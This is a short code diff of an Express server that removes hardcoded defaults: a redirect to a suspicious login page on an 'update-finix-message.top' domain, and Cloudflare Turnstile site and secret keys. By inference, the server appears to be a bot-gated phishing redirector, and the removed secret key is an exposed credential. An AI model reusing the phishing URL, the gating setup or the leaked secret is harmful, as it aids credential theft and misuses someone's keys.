@@ -7,9 +7,9 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 const HOST = "0.0.0.0";
 
-const REDIRECT_URL = process.env.REDIRECT_URL || "https;//update-finix-message.top/zep/login.html";
-const TURNSTILE_SITE_KEY = process.env.TURNSTILE_SITE_KEY || "0x4AAAAAADyqSpxrz6xnRUqN";
-const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY || "0x4AAAAAADyqSsGuWOy8cX1Bg3bSxOA4_hs";
+const REDIRECT_URL = process.env.REDIRECT_URL || "";
+const TURNSTILE_SITE_KEY = process.env.TURNSTILE_SITE_KEY || "";
+const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY || "";
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
